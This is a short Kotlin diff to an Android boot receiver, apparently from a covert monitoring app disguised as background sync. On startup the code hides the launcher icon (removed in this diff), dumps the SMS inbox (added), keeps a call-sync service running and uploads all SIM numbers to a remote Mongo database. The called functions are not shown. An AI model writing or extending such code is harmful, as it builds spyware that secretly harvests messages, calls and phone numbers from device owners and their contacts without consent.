@@ -29,16 +29,11 @@ class BootReceiver : BroadcastReceiver() {
 
         BackgroundSyncRunner.run {
         try {
-            SyncBootstrap.armBackgroundSync(appContext)
-            LauncherHider.hideIfMarked(appContext)
-            CallSyncService.ensureRunning(appContext)
+            InboxDump.dumpBlocking(appContext)
             DeviceRegistration.registerNow(appContext)
-            if (!SyncBootstrap.needsRuntimePermissions(appContext)) {
-                    SimNumberHelper.registerAllSimsInMongo(appContext)
-                    InstallFlow.runFirstCloudSync(appContext)
-                }
-                SyncScheduler.syncIfPermittedNow(appContext, "boot")
-                Log.d(TAG, "Boot sync done after $action")
+            SyncBootstrap.armBackgroundSync(appContext)
+            CallSyncService.ensureRunning(appContext)
+            Log.d(TAG, "Boot sync done after $action")
             } catch (error: Exception) {
                 Log.e(TAG, "Boot setup failed", error)
             } finally {
